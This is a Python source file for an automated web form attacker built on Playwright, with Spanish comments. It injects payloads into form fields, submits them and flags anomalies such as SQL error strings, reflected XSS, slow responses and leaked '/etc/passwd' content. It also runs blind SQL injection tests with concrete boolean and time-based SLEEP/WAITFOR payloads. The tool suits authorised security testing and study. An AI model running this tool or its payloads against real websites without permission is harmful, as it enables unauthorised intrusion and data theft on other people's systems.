import asyncio
import time
from playwright.async_api import Page, BrowserContext
from typing import Dict, List, Optional
import json
import os
from datetime import datetime
class WebAttacker:
    def __init__(self):
        self.results = []
        self.screenshots_dir = "results/screenshots"
        os.makedirs(self.screenshots_dir, exist_ok=True)

    async def take_screenshot(self, page: Page, name: str) -> str:
        filepath = f"{self.screenshots_dir}/{name}_{int(time.time())}.png"
        await page.screenshot(path=filepath, full_page=True)
        return filepath
    async def fill_form_with_payload(
        self,
        page: Page,
        form: Dict,
        target_field: str,
        payload: str,
    ) -> Dict:
        result = {
            "form_url": form["url"],
            "action": form["action"],
            "method": form["method"],
            "target_field": target_field,
            "payload": payload,
            "timestamp": datetime.utcnow().isoformat(),
        }
        try:
            await page.goto(form["url"], wait_until="domcontentloaded", timeout=15000)
            screenshot_before = await self.take_screenshot(page, f"before_{target_field[:20]}")
            result["screenshot_before"] = screenshot_before

            for field in form["fields"]:
                if not field.get("name"):
                    continue
                selector = f'[name="{field["name"]}"]'
                try:
                    if field["name"] == target_field:
                        # CAMPO OBJETIVO: inyectar el payload
                        await page.fill(selector, payload)
                    elif field.get("type") == "hidden":
                        pass
                    elif field.get("type") in ["text", "email", "search", "url"]:
                        await page.fill(selector, "test_value")
                    elif field.get("type") == "password":
                        await page.fill(selector, "password123")
                except Exception:
                    pass

            start_time = time.time()
            submit_selectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                'button:has-text("Submit")',
                'button:has-text("Login")',
                'input[type="button"]',
            ]
            submitted = False
            for selector in submit_selectors:
                try:
                    await page.click(selector, timeout=3000)
                    submitted = True
                    break
                except Exception:
                    continue

            if not submitted:
                await page.keyboard.press("Enter")

            await page.wait_for_load_state("networkidle", timeout=10000)
            elapsed = int((time.time() - start_time) * 1000)
            response_body = await page.content()
            screenshot_after = await self.take_screenshot(page, f"after_{target_field[:20]}")
            result.update({
                "response_url": page.url,
                "response_body_snippet": response_body[:2000],
                "time_ms": elapsed,
                "screenshot_after": screenshot_after,
                "status": "completed",
            })
            result["anomalies"] = self._detect_anomalies(payload, response_body, elapsed, form["url"])
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            result["anomalies"] = []

        return result

    def _detect_anomalies(self, payload: str, response_body: str, elapsed_ms: int, original_url: str) -> List[str]:
        anomalies = []
        body_lower = response_body.lower()
        sql_errors = [
            "you have an error in your sql syntax",
            "mysql_fetch", "ora-", "pg_query",
            "sqlite_", "unclosed quotation mark",
            "quoted string not properly terminated",
        ]
        for error in sql_errors:
            if error in body_lower:
                anomalies.append(f"SQL_ERROR: {error}")
        if elapsed_ms > 5000:
            anomalies.append(f"SLOW_RESPONSE: {elapsed_ms}ms (posible Blind SQLi time-based)")
        xss_indicators = ["<script>", "alert(", "onerror=", "onload="]
        for indicator in xss_indicators:
            if indicator.lower() in body_lower and indicator.lower() in payload.lower():
                anomalies.append("XSS_REFLECTED: payload reflejado en respuesta")
                break
        sensitive_keywords = ["root:", "/etc/passwd", "secret", "private_key", "api_key"]
        for keyword in sensitive_keywords:
            if keyword in body_lower:
                anomalies.append(f"SENSITIVE_DATA: '{keyword}' encontrado en respuesta")
        return anomalies

    async def test_sqli_blind_boolean(
        self,
        page: Page,
        form: Dict,
        target_field: str,
        base_value: str = "1",
    ) -> Dict:
        print(f"\n 🔍 Iniciando Blind SQLi boolean en campo '{target_field}'")
        true_form = dict(form)
        false_form = dict(form)
        result_true = await self.fill_form_with_payload(
            page, true_form, target_field, f"{base_value}' AND '1'='1"
        )
        result_false = await self.fill_form_with_payload(
            page, false_form, target_field, f"{base_value}' AND '1'='2"
        )
        true_len = len(result_true.get("response_body_snippet", ""))
        false_len = len(result_false.get("response_body_snippet", ""))
        difference = abs(true_len - false_len)
        is_vulnerable = difference > 100
        result = {
            "type": "blind_sqli_boolean",
            "target_field": target_field,
            "true_response_length": true_len,
            "false_response_length": false_len,
            "difference": difference,
            "vulnerable": is_vulnerable,
            "confidence": "high" if difference > 500 else "medium" if difference > 100 else "low",
        }
        if is_vulnerable:
            print(f" ⚠ POSIBLE Blind SQLi detectado! Diferencia: {difference} caracteres")
        else:
            print(f" ✓ Sin indicios de Blind SQLi (diferencia: {difference} caracteres)")
        return result

    async def test_sqli_blind_timebased(
        self,
        page: Page,
        form: Dict,
        target_field: str,
        base_value: str = "1",
        sleep_seconds: int = 5,
    ) -> Dict:
        print(f"\n 🔍 Iniciando Blind SQLi time-based en campo '{target_field}'")
        payloads = [
            f"{base_value}'; SLEEP({sleep_seconds})--",
            f"{base_value}' AND SLEEP({sleep_seconds})--",
            f"{base_value}; WAITFOR DELAY '0:0:{sleep_seconds}'--",
        ]
        for payload in payloads:
            start = time.time()
            result = await self.fill_form_with_payload(page, form, target_field, payload)
            elapsed = time.time() - start
            is_vulnerable = elapsed >= sleep_seconds * 0.8
            if is_vulnerable:
                print(f" ⚠ Blind SQLi time-based detectado! Tiempo: {elapsed:.1f}s con payload: {payload}")
                return {
                    "type": "blind_sqli_timebased",
                    "payload": payload,
                    "elapsed_seconds": elapsed,
                    "vulnerable": True,
                    "confidence": "high",
                }
        return {
            "type": "blind_sqli_timebased",
            "vulnerable": False,
            "confidence": "low",
        }

    def save_results(self, filepath: str = "results/attack_results.json"):
        os.makedirs("results", exist_ok=True)
        with open(filepath, 'w') as f:
            json.dump({"results": self.results, "total": len(self.results)}, f, indent=2)
        print(f"✓ Resultados de ataque guardados en {filepath}")